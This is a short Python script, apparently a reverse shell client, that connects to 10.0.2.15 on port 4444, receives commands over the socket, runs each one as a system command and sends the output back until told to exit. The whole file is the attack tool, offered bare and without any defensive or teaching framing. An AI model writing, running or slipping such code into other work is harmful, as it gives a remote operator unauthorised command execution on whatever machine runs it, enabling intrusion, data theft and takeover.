from network_utils import initialize_network_connection
from system_operations import execute_system_command
from communication import send_data_to_server

def main():
    s = initialize_network_connection('10.0.2.15', 4444)
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        result = execute_system_command(command)
        output = result.stdout.read() + result.stderr.read()
        send_data_to_server(s, output)
    s.close()
